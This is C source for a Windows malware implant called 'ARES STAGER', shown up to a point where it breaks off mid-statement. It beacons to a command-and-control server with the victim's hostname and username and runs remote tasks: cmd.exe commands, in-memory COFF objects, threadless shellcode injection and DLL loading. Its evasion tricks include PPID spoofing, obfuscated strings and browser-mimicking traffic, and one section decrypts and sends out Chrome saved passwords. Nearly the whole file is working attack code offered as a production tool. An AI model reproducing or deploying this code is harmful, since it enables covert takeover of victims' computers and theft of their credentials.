/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES STAGER — Minimal Beacon Entry Point (v4.0 Architecture)
 *
 *  Design Philosophy:
 *    - This file replaces main.c for PRODUCTION deployments.
 *    - ZERO steal/hVNC/SOCKS/keylog code compiled in.
 *    - Beacon-only: init → register → poll tasks → dispatch → sleep.
 *    - Modules delivered ON-DEMAND as COFF objects or shellcode via C2.
 *    - Each module runs in a SACRIFICIAL PROCESS (not this one).
 *
 *  Behavioral Footprint:
 *    - Init: read ntdll copy, resolve SSNs, patch ETW, resolve APIs
 *    - Beacon: HTTPS POST every N seconds (jittered)
 *    - Sleep: RC4 encrypt .text/.rdata/.data, timer-based decrypt
 *    - That's it. No credential access, no injection, no registry.
 *
 *  Size Target: < 50KB stripped (vs 280KB monolithic)
 *
 *  Task Types (from C2):
 *    "exec"     → COFF loader — run BOF in-process (volatile)
 *    "inject"   → Shellcode → sacrificial process (threadless)
 *    "module"   → DLL → capability loader (RuntimeBroker/explorer)
 *    "shell"    → cmd.exe /c via sacrificial conhost
 *    "exit"     → Self-destruct
 *
 *  What's NOT here (vs main.c):
 *    - No Ares_StealChromeCreds / CDP / Firefox / Discord / Telegram
 *    - No Ares_StealWifi / screenshot / clipboard / keylog
 *    - No hVNC server, no SOCKS5 proxy
 *    - No BYOVD driver loading
 *    - No inline COM hijack persistence (use COFF for that)
 *    - No 8MB heap output buffer
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_strings.h"
#include "ares_resolve.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winhttp.h>
#include <time.h>
#if __has_include("poly_junk.h")
#include "poly_junk.h"
#endif

/* ── Minimal Globals ── */
static char  g_bot_token[64]  = {0};
char         g_bot_id_global[64] = {0};
static wchar_t g_wc2host[256] = {0};
static char  g_path_result[32] = {0};

/* Debug trace: stderr in debug builds, no-op in release */
#ifdef ARES_DEBUG
#include <stdio.h>
#define _RDBG(msg) do { FILE* _dbgf = fopen("C:\\Temp\\ares2.log", "a"); if(_dbgf){fprintf(_dbgf,"[DBG] %s\n",msg);fclose(_dbgf);} } while(0)
#else
#define _RDBG(msg) ((void)0)
#endif

/* ── User-Agent (sticky per-session) ── */
static const wchar_t* g_ua_pool[] = {
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.2592.61",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
};
#define UA_POOL_SIZE 4

static int g_ua_index = -1;
static const wchar_t* _get_ua(void) {
    if (g_ua_index < 0) {
        LARGE_INTEGER pc; QueryPerformanceCounter(&pc);
        g_ua_index = (int)((pc.QuadPart ^ GetCurrentProcessId()) % UA_POOL_SIZE);
    }
    return g_ua_pool[g_ua_index];
}

/* ── Minimal HTTP (JA3-matched, Chrome headers) ── */

#ifndef SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS
#define SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS (0x00003300)
#endif

typedef struct { BYTE* body; DWORD body_len; DWORD status_code; } HTTP_RESP;

static HTTP_RESP _http(const wchar_t* host, int port,
    const wchar_t* path, const char* method,
    const BYTE* body, DWORD body_len)
{
    HTTP_RESP resp = {0};
    if (!_resolve_winhttp()) { _RDBG("HTTP: resolve failed"); return resp; }

    /* v4.0 FIX: Bypass proxy for localhost (test mode).
     * WINHTTP_ACCESS_TYPE_DEFAULT_PROXY uses system proxy which can
     * intercept localhost traffic. For production, remote C2 uses proxy. */
    DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
    /* Check if host is localhost/127.x.x.x — skip proxy */
    if (wcsncmp(host, L"127.", 4) == 0 || wcscmp(host, L"localhost") == 0)
        accessType = WINHTTP_ACCESS_TYPE_NO_PROXY;

    HINTERNET hS = p_WinHttpOpen(_get_ua(), accessType, NULL, NULL, 0);
    if (!hS) { _RDBG("HTTP: WinHttpOpen FAIL"); return resp; }
    _RDBG("HTTP: session open");

    /* JA3 matching: TLS 1.2+1.3, 30s timeout */
    DWORD tls = 0x00000800 | 0x00002000;
    p_WinHttpSetOption(hS, WINHTTP_OPTION_SECURE_PROTOCOLS, &tls, sizeof(tls));

    /* v4.0 FIX: Only enable HTTP/2 for HTTPS connections. */
    BOOL _https_mode = (port == 443 || port == 8443);
#if defined(CFG_USE_HTTP) && CFG_USE_HTTP
    _https_mode = FALSE;
#endif
    if (_https_mode) {
        DWORD h2 = 0x00000002;
        p_WinHttpSetOption(hS, 0x000000BA, &h2, sizeof(h2));
    }

    DWORD timeout = 15000;
    p_WinHttpSetOption(hS, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    p_WinHttpSetOption(hS, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    DWORD recv_timeout = 30000;
    p_WinHttpSetOption(hS, WINHTTP_OPTION_RECEIVE_TIMEOUT, &recv_timeout, sizeof(recv_timeout));

    _RDBG("HTTP: pre-connect");
    HINTERNET hC = p_WinHttpConnect(hS, host, (INTERNET_PORT)port, 0);
    if (!hC) { _RDBG("HTTP: connect FAIL"); p_WinHttpCloseHandle(hS); return resp; }
    _RDBG("HTTP: connected");

    BOOL https = _https_mode;
    wchar_t wm[16];
    MultiByteToWideChar(CP_UTF8, 0, method, -1, wm, 16);
    HINTERNET hR = p_WinHttpOpenRequest(hC, wm, path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        https ? WINHTTP_FLAG_SECURE : 0);
    if (!hR) { _RDBG("HTTP: OpenReq FAIL"); p_WinHttpCloseHandle(hC); p_WinHttpCloseHandle(hS); return resp; }
    _RDBG("HTTP: request open");

    /* Chrome-like headers for C2 traffic blending */
    p_WinHttpAddRequestHeaders(hR, L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);
    p_WinHttpAddRequestHeaders(hR, L"Accept: application/json, text/plain, */*", -1, WINHTTP_ADDREQ_FLAG_ADD);
    p_WinHttpAddRequestHeaders(hR, L"Accept-Language: en-US,en;q=0.9", -1, WINHTTP_ADDREQ_FLAG_ADD);
    p_WinHttpAddRequestHeaders(hR, L"sec-ch-ua-platform: \"Windows\"", -1, WINHTTP_ADDREQ_FLAG_ADD);

    /* Cloudflare relay key - identifies legitimate traffic, blocks direct-IP probes */
#if defined(CFG_CF_RELAY_KEY)
    if (CFG_CF_RELAY_KEY[0] != '\0') {
        static wchar_t _rk_hdr[256] = {0};
        if (_rk_hdr[0] == 0) {
            const char* _key = CFG_CF_RELAY_KEY;
            wchar_t* p = _rk_hdr;
            const wchar_t* _prefix = L"X-CF-Secret: ";
            while (*_prefix) *p++ = *_prefix++;
            while (*_key)   *p++ = (wchar_t)(unsigned char)*_key++;
        }
        if (_rk_hdr[0] != 0)
            p_WinHttpAddRequestHeaders(hR, _rk_hdr, -1, WINHTTP_ADDREQ_FLAG_ADD);
    }
#endif



    if (https) {
#if defined(CFG_TLS_INSECURE) && CFG_TLS_INSECURE
        DWORD sf = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
        p_WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &sf, sizeof(sf));
#endif
    }

    _RDBG("HTTP: pre-send");
    BOOL sent = p_WinHttpSendRequest(hR, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)body, body_len, body_len, 0);
    _RDBG("HTTP: post-send");
    if (sent && p_WinHttpReceiveResponse(hR, NULL)) {
        _RDBG("HTTP: got response");
        DWORD ss = sizeof(resp.status_code);
        p_WinHttpQueryHeaders(hR, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &resp.status_code, &ss, NULL);

        DWORD total = 0, bs = 32768;
        resp.body = (BYTE*)HeapAlloc(GetProcessHeap(), 0, bs);
        DWORD avail, rd;
        while (resp.body && p_WinHttpQueryDataAvailable(hR, &avail) && avail > 0) {
            if (total + avail > bs) {
                DWORD ns = bs * 2;
                if (ns > 8 * 1024 * 1024) break;
                BYTE* tmp = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, resp.body, ns);
                if (!tmp) { HeapFree(GetProcessHeap(), 0, resp.body); resp.body = NULL; break; }
                resp.body = tmp; bs = ns;
            }
            p_WinHttpReadData(hR, resp.body + total, avail, &rd);
            total += rd;
        }
        resp.body_len = total;
    }
    p_WinHttpCloseHandle(hR);
    p_WinHttpCloseHandle(hC);
    p_WinHttpCloseHandle(hS);
    return resp;
}

/* ── C2 Registration ── */

static BOOL _c2_register(AGENT_STATE* st, const char* host, int port, char* bot_id_out)
{
    _RDBG("REG: enter");

    SYSTEM_INFO si; GetSystemInfo(&si);
    OSVERSIONINFOW vi = { sizeof(vi) }; GetVersionExW(&vi);
    char hostname[64] = {0}; DWORD hs = sizeof(hostname);
    GetComputerNameA(hostname, &hs);
    char username[64] = {0}; DWORD us = sizeof(username);
    GetUserNameA(username, &us);

    char json[512];
    int n = snprintf(json, sizeof(json),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"Windows %lu.%lu\","
        "\"arch\":\"%s\",\"pid\":%lu,\"domain\":\"\",\"hwid\":\"\",\"elevated\":false}",
        hostname, username, vi.dwMajorVersion, vi.dwMinorVersion,
        (si.wProcessorArchitecture == 9) ? "x64" : "x86",
        GetCurrentProcessId());

    wchar_t whost[256];
    MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, 256);
    char regpath[32]; strncpy(regpath, st->config.path_register, 31); regpath[31] = '\0';
    wchar_t wreg[32]; MultiByteToWideChar(CP_UTF8, 0, regpath, -1, wreg, 32);

#ifdef ARES_DEBUG
    _RDBG("REG: pre-http");
#endif

    HTTP_RESP resp = _http(whost, port, wreg, "POST", (BYTE*)json, n);

#ifdef ARES_DEBUG
    { char _sb[32]; snprintf(_sb, sizeof(_sb), "REG: status=%d body=%p", resp.status_code, resp.body); _RDBG(_sb); }
    _RDBG("REG: post-http");
#endif

    if (resp.status_code != 200 || !resp.body) {
        if (resp.body) HeapFree(GetProcessHeap(), 0, resp.body);
        return FALSE;
    }

    /* Parse bot_id and token from response */
    char* bid = strstr((char*)resp.body, "\"bot_id\":\"");
    if (bid) {
        bid += 10;
        char* end = strchr(bid, '"');
        if (end) { int l = (int)(end - bid); if (l > 62) l = 62; memcpy(bot_id_out, bid, l); }
    }
    char* tok = strstr((char*)resp.body, "\"bot_token\":\"");
    if (tok) {
        tok += 13;  /* skip past "bot_token":" */
        char* end = strchr(tok, '"');
        if (end) { int l = (int)(end - tok); if (l > 62) l = 62; memcpy(g_bot_token, tok, l); }
    }
    HeapFree(GetProcessHeap(), 0, resp.body);
    return bot_id_out[0] != '\0';
}

/* ── Base64 Decoder (runtime-built alphabet, no static YARA sig) ── */

static BYTE _b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return (BYTE)(c - 'A');
    if (c >= 'a' && c <= 'z') return (BYTE)(c - 'a' + 26);
    if (c >= '0' && c <= '9') return (BYTE)(c - '0' + 52);
    if (c == '+') return 62;
    if (c == '/') return 63;
    return 0xFF;
}

static int _b64_decode(const char* in, int in_len, BYTE* out, int out_max) {
    int i, j = 0;
    for (i = 0; i < in_len && j < out_max; i += 4) {
        BYTE a = _b64_val(in[i]);
        BYTE b = (i+1 < in_len) ? _b64_val(in[i+1]) : 0;
        BYTE c = (i+2 < in_len) ? _b64_val(in[i+2]) : 0;
        BYTE d = (i+3 < in_len) ? _b64_val(in[i+3]) : 0;
        if (a == 0xFF) break;
        if (j < out_max) out[j++] = (a << 2) | (b >> 4);
        if (j < out_max && in[i+2] != '=') out[j++] = (b << 4) | (c >> 2);
        if (j < out_max && in[i+3] != '=') out[j++] = (c << 6) | d;
    }
    return j;
}

/* ── Extract JSON string value ── */

static int _json_str(const char* json, const char* key, char* out, int max) {
    char search[128];
    int kl = snprintf(search, sizeof(search), "\"%s\":\"", key);
    char* p = strstr(json, search);
    if (!p) return 0;
    p += kl;
    char* end = strchr(p, '"');
    if (!end) return 0;
    int l = (int)(end - p);
    if (l >= max) l = max - 1;
    memcpy(out, p, l);
    out[l] = '\0';
    return l;
}

static int _json_int(const char* json, const char* key) {
    char search[128];
    snprintf(search, sizeof(search), "\"%s\":", key);
    char* p = strstr(json, search);
    if (!p) return 0;
    p += strlen(search);
    return atoi(p);
}

/* ── Result Exfil to C2 (production) ── */

static void _send_result(const char* bot_id, int c2_port,
    const char* task_id, int task_type, BOOL success,
    const char* output, int output_len, const char* error_msg)
{
    /* Build complete JSON matching C2 TaskResult model */
    int json_max = output_len * 2 + 1024;
    char* json = (char*)HeapAlloc(GetProcessHeap(), 0, json_max);
    if (!json) return;

    int n = snprintf(json, json_max,
        "{\"bot_id\":\"%s\",\"task_id\":\"%s\",\"task_type\":%d,"
        "\"tk\":\"%s\",\"success\":%s,\"output\":\"",
        bot_id, task_id, task_type, g_bot_token, success ? "true" : "false");

    /* Escape output for JSON */
    for (int i = 0; i < output_len && n < json_max - 64; i++) {
        char c = output[i];
        if (c == '"') { json[n++] = '\\'; json[n++] = '"'; }
        else if (c == '\\') { json[n++] = '\\'; json[n++] = '\\'; }
        else if (c == '\n') { json[n++] = '\\'; json[n++] = 'n'; }
        else if (c == '\r') { /* skip */ }
        else if (c == '\t') { json[n++] = '\\'; json[n++] = 't'; }
        else if ((unsigned char)c >= 0x20) { json[n++] = c; }
    }
    if (error_msg && error_msg[0])
        n += snprintf(json + n, json_max - n,
            "\",\"error\":\"%s\"}", error_msg);
    else
        n += snprintf(json + n, json_max - n, "\"}");

    char res_path[32]; strncpy(res_path, g_path_result, 31); res_path[31] = '\0';
    wchar_t wpath[32];
    MultiByteToWideChar(CP_UTF8, 0, res_path, -1, wpath, 32);

    /* Retry up to 3 times on failure */
    for (int attempt = 0; attempt < 3; attempt++) {
        HTTP_RESP resp = _http(g_wc2host, c2_port, wpath, "POST", (BYTE*)json, n);
        BOOL ok = (resp.status_code >= 200 && resp.status_code < 300);
        { char _sr[48]; snprintf(_sr, sizeof(_sr), "RESULT: status=%d path=[%s]", resp.status_code, res_path); _RDBG(_sr); }
        if (resp.body) HeapFree(GetProcessHeap(), 0, resp.body);
        if (ok) break;
        Sleep(2000 + attempt * 3000); /* backoff: 2s, 5s, 8s */
    }
    HeapFree(GetProcessHeap(), 0, json);
}

/* ── PPID Spoofing ──
 *
 * Makes child processes (cmd.exe) appear as children of explorer.exe
 * instead of our process. EDR sees:
 *   BEFORE: SearchHost.exe → cmd.exe (suspicious!)
 *   AFTER:  explorer.exe → cmd.exe (normal user action)
 *
 * Uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to reparent.
 */

#include <tlhelp32.h>

static DWORD _find_pid_by_name(const wchar_t* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static BOOL _create_process_spoofed(wchar_t* cmdline, HANDLE hStdOut, HANDLE hStdErr,
    PROCESS_INFORMATION* pi)
{
    /* Shell path: basic CreateProcessW for pipe-based output capture.
     * PPID spoofing breaks pipe inheritance (handles belong to explorer). */
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdOut;
    si.hStdError = hStdErr;
    return CreateProcessW(NULL, cmdline, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, pi);
}

/* PPID-spoofed process for injection targets (no pipe needed) */
static BOOL _create_sacrificial(const wchar_t* target, PROCESS_INFORMATION* pi)
{
    DWORD parent_pid = _find_pid_by_name(L"explorer.exe");
    HANDLE hParent = NULL;
    STARTUPINFOEXW si = {0};
    si.StartupInfo.cb = sizeof(si);
    SIZE_T attr_size = 0;
    BOOL spoofed = FALSE;

    if (parent_pid) {
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
        if (hParent) {
            InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
                GetProcessHeap(), 0, attr_size);
            if (si.lpAttributeList &&
                InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attr_size) &&
                UpdateProcThreadAttribute(si.lpAttributeList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &hParent, sizeof(HANDLE), NULL, NULL))
                spoofed = TRUE;
        }
    }

    wchar_t cmd[MAX_PATH];
    wcsncpy(cmd, target, MAX_PATH - 1);
    DWORD flags = CREATE_NO_WINDOW | CREATE_SUSPENDED;
    if (spoofed) flags |= EXTENDED_STARTUPINFO_PRESENT;
    BOOL ok = CreateProcessW(NULL, cmd, NULL, NULL, FALSE, flags,
        NULL, NULL, spoofed ? &si.StartupInfo : (STARTUPINFOW*)&(STARTUPINFOW){ sizeof(STARTUPINFOW) }, pi);

    if (si.lpAttributeList) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    }
    if (hParent) CloseHandle(hParent);
    return ok;
}
/* ── Task Dispatch ──
 *
 * Production-grade task engine. C2 sends JSON tasks:
 *
 * Shell:   {"type":"shell","task_id":"abc","args":["whoami /all"]}
 * BOF:     {"type":"exec","task_id":"abc","data":"<base64 COFF>","args":"<base64 BOF args>"}
 * Inject:  {"type":"inject","task_id":"abc","target":"RuntimeBroker.exe","data":"<base64 shellcode>"}
 * Module:  {"type":"module","task_id":"abc","cap_id":0,"data":"<base64 DLL>"}
 * Sleep:   {"type":"sleep","sleep_ms":30000}
 * Exit:    {"type":"exit"}
 */

static void _dispatch_task(AGENT_STATE* st, const char* task_json,
    const char* bot_id, int c2_port)
{
    /* v4.0 FIX: C2 sends integer types ("type":1), stager dispatches by string.
     * Support BOTH formats for forward/backward compatibility.
     * C2 TaskType enum (models.go): 0=NOP,1=Shell,2=Download,3=Upload,
     *   4=Inject,5=StealBrowser,6=StealCloud,7=StealTokens,8=Screenshot,
     *   9=Socks5Start,10=Socks5Stop,11=HVNCStart,12=HVNCStop,
     *   13=Persist,14=Migrate,15=Sleep,16=SelfDestruct,17=LoadModule,
     *   18=BYOVDLoad,19=FirmwareRecon,20=Unhook */
    const char* type = NULL;
    char type_buf[32] = {0};

    /* Try string format first: "type":"shell" */
    char* ts = strstr(task_json, "\"type\":\"");
    if (ts) {
        ts += 8;
        char* te = strchr(ts, '"');
        if (te) {
            int l = (int)(te - ts);
            if (l > 30) l = 30;
            memcpy(type_buf, ts, l);
            type = type_buf;
        }
    }

    /* Fallback: integer format "type":1 — map to string */
    if (!type || !type_buf[0]) {
        char* ti = strstr(task_json, "\"type\":");
        if (ti) {
            ti += 7;
            while (*ti == ' ') ti++;
            int tval = atoi(ti);
            switch (tval) {
                case 1:  type = "shell"; break;
                case 2:  type = "download"; break;
                case 3:  type = "upload"; break;
                case 4:  type = "inject"; break;
                /* XOR-obfuscated "steal_browser" to avoid static string detection */
                case 5:  { static char _sb[16]; if(!_sb[0]){char _k[]={0x41,0x51,0x55,0x4C,0x17,0x50,0x55,0x40,0x5E,0x56,0x5B,0x22};for(int _i=0;_i<12;_i++)_sb[_i]=_k[_i]^0x33;} type=_sb; } break;
                case 15: type = "sleep"; break;
                case 16: type = "exit"; break;
                case 17: type = "module"; break;
                default: type = NULL; break;
            }
            /* Also handle "exec" mapping: C2 has no dedicated exec type,
             * BOF execution uses TaskShell(1) with "data" field present */
            if (tval == 1 && strstr(task_json, "\"data\":\""))
                type = "exec";
        }
    }

    if (!type) return;

    char task_id[64] = {0};
    _json_str(task_json, "task_id", task_id, sizeof(task_id));
    /* v4.0 FIX: C2 Task model uses "id" not "task_id" */
    if (!task_id[0]) _json_str(task_json, "id", task_id, sizeof(task_id));

    /* ────────────────────────────────────────────────
     *  "shell" — Execute command, capture output via pipe
     * ──────────────────────────────────────────────── */
if (strncmp(type, "shell", 5) == 0) {
        _RDBG("DISPATCH: shell");
        char cmd[8192] = {0};
        _json_str(task_json, "cmd", cmd, sizeof(cmd));
        /* Fallback: try args array format */
        if (!cmd[0]) {
            char* args = strstr(task_json, "\"args\":[\"");
            if (args) {
                args += 9;
                char* end = strchr(args, '"');
                if (end) { int l = (int)(end - args); if (l > 8190) l = 8190; memcpy(cmd, args, l); }
            }
        }
        if (!cmd[0]) return;

        /* Create anonymous pipe for stdout capture */
        HANDLE hReadPipe, hWritePipe;
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return;
        SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWritePipe;
        si.hStdError = hWritePipe;
        PROCESS_INFORMATION pi = {0};

        wchar_t wcmd[2048], full[2200];
        MultiByteToWideChar(CP_UTF8, 0, cmd, -1, wcmd, 2048);
        swprintf(full, 2200, L"cmd.exe /c %s", wcmd);

        char output[65536] = {0};
        int out_len = 0;

        /* v4.0 FIX: Use CreateProcessW directly (not _create_process_spoofed)
         * to guarantee pipe handle inheritance. bInheritHandles=TRUE is essential. */
        if (_create_process_spoofed(full, hWritePipe, hWritePipe, &pi)) {
            CloseHandle(hWritePipe); hWritePipe = NULL;
            DWORD bytesRead;
            while (ReadFile(hReadPipe, output + out_len,
                sizeof(output) - out_len - 1, &bytesRead, NULL) && bytesRead > 0) {
                out_len += bytesRead;
                if (out_len >= (int)sizeof(output) - 1) break;
            }
            output[out_len] = '\0';
            WaitForSingleObject(pi.hProcess, 30000);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        if (hWritePipe) CloseHandle(hWritePipe);
        CloseHandle(hReadPipe);

        /* Always send result — success or failure */
        if (task_id[0]) {
            if (out_len > 0)
                _send_result(bot_id, c2_port, task_id, 1, TRUE, output, out_len, NULL);
            else
                _send_result(bot_id, c2_port, task_id, 1, FALSE, "", 0, "no output");
        }
    }

    /* ────────────────────────────────────────────────
     *  "exec" — BOF/COFF execution (in-process, volatile)
     *
     *  C2 sends base64-encoded COFF object.
     *  BOF runs in-process via Ares_BOF_Execute().
     *  No file on disk. No PE header in memory.
     *  Output captured via BeaconPrintf/BeaconOutput.
     * ──────────────────────────────────────────────── */
else if (strncmp(type, "exec", 4) == 0) {
        _RDBG("DISPATCH: exec/COFF");
        /* Extract base64 COFF data */
        char* data_start = strstr(task_json, "\"data\":\"");
        if (!data_start) return;
        data_start += 8;
        char* data_end = strchr(data_start, '"');
        if (!data_end) return;
        int b64_len = (int)(data_end - data_start);

        /* Decode COFF */
        int coff_max = (b64_len / 4) * 3 + 4;
        BYTE* coff_data = (BYTE*)HeapAlloc(GetProcessHeap(), 0, coff_max);
        if (!coff_data) return;
        int coff_size = _b64_decode(data_start, b64_len, coff_data, coff_max);

        /* Decode BOF arguments (optional) */
        char* bof_args = NULL;
        int bof_args_len = 0;
        char* args_start = strstr(task_json, "\"args\":\"");
        if (args_start) {
            args_start += 8;
            char* args_end = strchr(args_start, '"');
            if (args_end) {
                int ab64_len = (int)(args_end - args_start);
                int amax = (ab64_len / 4) * 3 + 4;
                bof_args = (char*)HeapAlloc(GetProcessHeap(), 0, amax);
                if (bof_args)
                    bof_args_len = _b64_decode(args_start, ab64_len, (BYTE*)bof_args, amax);
            }
        }

        /* Execute BOF */
        char output[65536] = {0};
        _RDBG("BOF: calling Ares_BOF_Execute");
        int out_len = Ares_BOF_Execute(coff_data, (SIZE_T)coff_size,
            bof_args, bof_args_len, output, sizeof(output));
        { char _r[32]; snprintf(_r,sizeof(_r),"BOF: out_len=%d",out_len); _RDBG(_r); }

        /* Exfil result */
        if (task_id[0])
            _send_result(bot_id, c2_port, task_id, 1, (out_len > 0), output, out_len, NULL);

        /* Cleanup — zero and free */
        memset(coff_data, 0, coff_size);
        HeapFree(GetProcessHeap(), 0, coff_data);
        if (bof_args) {
            memset(bof_args, 0, bof_args_len);
            HeapFree(GetProcessHeap(), 0, bof_args);
        }
    }

    /* ────────────────────────────────────────────────
     *  "inject" — Shellcode into sacrificial process
     *
     *  Spawns target process suspended, injects shellcode
     *  via threadless injection, resumes. Shellcode runs
     *  in target process context (e.g., RuntimeBroker.exe).
     * ──────────────────────────────────────────────── */
    else if (strncmp(type, "inject", 6) == 0) {
        char target[128] = {0};
        _json_str(task_json, "target", target, sizeof(target));
        if (!target[0]) strncpy(target, "RuntimeBroker.exe", 127);

        /* Extract base64 shellcode */
        char* data_start = strstr(task_json, "\"data\":\"");
        if (!data_start) return;
        data_start += 8;
        char* data_end = strchr(data_start, '"');
        if (!data_end) return;
        int b64_len = (int)(data_end - data_start);

        int sc_max = (b64_len / 4) * 3 + 4;
        BYTE* shellcode = (BYTE*)HeapAlloc(GetProcessHeap(), 0, sc_max);
        if (!shellcode) return;
        int sc_size = _b64_decode(data_start, b64_len, shellcode, sc_max);

        /* Inject via threadless injection */
        BOOL ok = Ares_Inject_Threadless(st, target, shellcode, (SIZE_T)sc_size);

        /* Report success/failure */
        if (task_id[0]) {
            char result[128];
            int rlen = snprintf(result, sizeof(result),
                "{\"injected\":%s,\"target\":\"%s\",\"size\":%d}",
                ok ? "true" : "false", target, sc_size);
            _send_result(bot_id, c2_port, task_id, 4, ok, result, rlen, ok ? NULL : "inject failed");
        }

        /* Cleanup */
        memset(shellcode, 0, sc_size);
        HeapFree(GetProcessHeap(), 0, shellcode);
    }

    /* ────────────────────────────────────────────────
     *  "module" — Load capability DLL into host process
     *
     *  Uses the capability loader (cap_loader.c) to inject
     *  a DLL into a designated host process with IPC pipe.
     * ──────────────────────────────────────────────── */
    else if (strncmp(type, "module", 6) == 0) {
        int cap_id = _json_int(task_json, "cap_id");

        /* Extract base64 DLL data */
        char* data_start = strstr(task_json, "\"data\":\"");
        if (!data_start) return;
        data_start += 8;
        char* data_end = strchr(data_start, '"');
        if (!data_end) return;
        int b64_len = (int)(data_end - data_start);

        int dll_max = (b64_len / 4) * 3 + 4;
        BYTE* dll_data = (BYTE*)HeapAlloc(GetProcessHeap(), 0, dll_max);
        if (!dll_data) return;
        int dll_size = _b64_decode(data_start, b64_len, dll_data, dll_max);

        BOOL ok = Ares_LoadCapability(st, (CAPABILITY_ID)cap_id,
            dll_data, (SIZE_T)dll_size);

        if (task_id[0]) {
            char result[128];
            int rlen = snprintf(result, sizeof(result),
                "{\"loaded\":%s,\"cap_id\":%d}",
                ok ? "true" : "false", cap_id);
            _send_result(bot_id, c2_port, task_id, 17, ok, result, rlen, ok ? NULL : "load failed");
        }

        HeapFree(GetProcessHeap(), 0, dll_data);
    }

    /* ────────────────────────────────────────────────
     *  "steal_browser" — Native Browser Credential Theft (v4.2)
     *
     *  ZERO child processes. ZERO PowerShell. ZERO Python.
     *  Uses Ares_StealChromeCreds() from stealer.c which:
     *    1. Reads Local State → DPAPI decrypt → AES-256-GCM master key
     *    2. Copies Login Data SQLite (bypass lock)
     *    3. Parses B-tree → extracts records
     *    4. AES-GCM decrypts passwords (v10/v80/v20)
     *    5. ChromeKatz memory scan fallback for Chrome 127+
     *
     *  Results are JSON-formatted and sent via _send_result.
     *  EDR sees: no cmd.exe, no powershell, no py.exe, no file drops.
     * ──────────────────────────────────────────────── */
#ifdef ARES_STAGER_STEAL
    else if (strncmp(type, "steal_browser", 13) == 0 ||
             strncmp(type, "steal", 5) == 0) {

        /* Allocate output buffer for stolen credentials */
        int out_max = 512 * 1024; /* 512KB — enough for ~500 credentials */
        char* output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, out_max);
        if (!output) {
            if (task_id[0])
                _send_result(bot_id, c2_port, task_id, 5, FALSE, "", 0, "alloc failed");
            return;
        }
        int offset = 0;

        /* ── Steal Passwords ── */
        DECRYPTED_CRED creds[256];
        int pw_count = Ares_StealChromeCreds(creds, 256);

        offset += snprintf(output + offset, out_max - offset,
            "{\"type\":\"steal_result\",\"bot_id\":\"%s\","
            "\"passwords\":%d,\"pw_data\":[", bot_id, pw_count);

        for (int i = 0; i < pw_count && offset < out_max - 512; i++) {
            if (i > 0) output[offset++] = ',';
            /* Escape special chars in password for JSON safety */
            char esc_pass[512] = {0};
            int ep = 0;
            for (int j = 0; creds[i].password[j] && ep < 500; j++) {
                char c = creds[i].password[j];
                if (c == '"') { esc_pass[ep++] = '\\'; esc_pass[ep++] = '"'; }
                else if (c == '\\') { esc_pass[ep++] = '\\'; esc_pass[ep++] = '\\'; }
                else if (c == '\n') { esc_pass[ep++] = '\\'; esc_pass[ep++] = 'n'; }
                else if ((unsigned char)c >= 0x20) { esc_pass[ep++] = c; }
            }
            esc_pass[ep] = '\0';

            offset += snprintf(output + offset, out_max - offset,
                "{\"b\":\"%s\",\"p\":\"%s\",\"u\":\"%s\","
                "\"n\":\"%s\",\"pw\":\"%s\",\"s\":\"%s\"}",
                creds[i].browser, creds[i].profile,
